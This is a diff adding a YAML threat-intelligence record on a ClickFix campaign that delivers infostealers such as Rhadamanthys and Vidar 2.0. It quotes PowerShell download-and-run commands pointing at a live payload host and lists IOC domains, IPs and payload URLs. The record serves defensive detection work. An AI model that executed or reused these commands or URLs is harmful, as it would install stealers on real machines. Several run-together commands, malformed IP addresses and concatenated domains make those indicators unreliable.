@@ -1,0 +1,69 @@
+description: Attack uses PowerShell to elevate privileges, set Defender exclusions,
+  download multiple payloads including infostealers like Rhadamanthys and Vidar 2.0.
+attribution: Unknown threat actor
+malware_families:
+- Rhadamanthys
+- Vidar 2.0
+- RedLine
+- Amadey
+- Femdexe
+- Tmshiaexe
+TTPs:
+  processes:
+  - amdsse
+  commandline:
+  - rvogXuIHfej -OutFile $v3ReSVBMBHStart-Process -FilePath $v3ReSVBMBH$nrvogXuIHfej
+    = "http://178.16.55.189/files/unique3/5.exe"$V3ReSVBMBH = "C:\\Windows\\Temp\\GaB56vUQmQb.exe"Invoke-WebRequest
+    -Uri $nrvogXuIHfej -OutFile $v3ReSVBMBHStart-Process -FilePath $v3ReSVBMBH$nrvogXuIHfej
+    = "http://178.16.55.189/sand/6.exe"$V3ReSVBMBH = "C:\\Windows\\Temp\\wipGqsPkmBRHn4
+    . exe"Invoke-WebRequest -Uri $nrvogXuIHfej -OutFile $v3ReSVBMBH
+  powershell:
+  - Invoke-WebRequest -Uri http://178.16.55.189/files/unique3/5.exe -OutFile C:\Windows\Temp\GaB56vUQmQb.exe
+  - Invoke-WebRequest -Uri http://178.16.55.189/sand/6.exe -OutFile C:\Windows\Temp\wipGqsPkmBRHn4
+    . exe
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: amdsse
+    destination: 178.16.55.189
+    port: ''
+  file_activity:
+  - C:\Windows\Temp\GaB56vUQmQb.exe
+  - C:\Windows\Temp\wipGqsPkmBRHn4 . exe
+  persistence: []
+  process_relations: []
+authors:
+- Eliad Kimhy
+IOCs:
+- accdomain3.rucmevents.livecmevents.procosmicpharma-bd.com
+- dcontrols.prodoyarkaissela.com
+- fcontrols.progalaxyswapper.pro
+- groupewadesecurity.com
+- hcontrol.prohidikiss.online
+- infernolo.com
+- lcontrols1.rulcontrols10.rulcontrols3.rulcontrols4.rulcontrols5.rulcontrols7.rulcontrols8.rulcontrols9.ruonlimegabests.onlinesecuritysettings.livesportsstories.grupdatesbrows.appverificationsbycapcha.centervirhtechgmbh.com
+- www.cmevents.pro
+- www.cosmicpharma-bd.com
+- www.sportsstories.gr
+- www.verificationsbycapcha.center
+- Xpolkfsddlswwkjddsljsy.com
+- 5.129.216.165
+- 5.219.23194
+- 74.164.13694
+- 154.35.25141
+- 98.80.175142
+- 11.214.171178
+- 16.54.200178
+- 16.55.189192
+- 177.26.79192
+- 177.26.210194
+- 87.55.59
+- 178.16.55.189
+- http://178.16.55.189/files/unique3/5.exe
+- http://178.16.55.189/sand/6.exe
+authors:
+- Eliad Kimhy
+reference: https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix
+date_of_publication: November 25, 2025
+file_creation_date: November 29, 2025
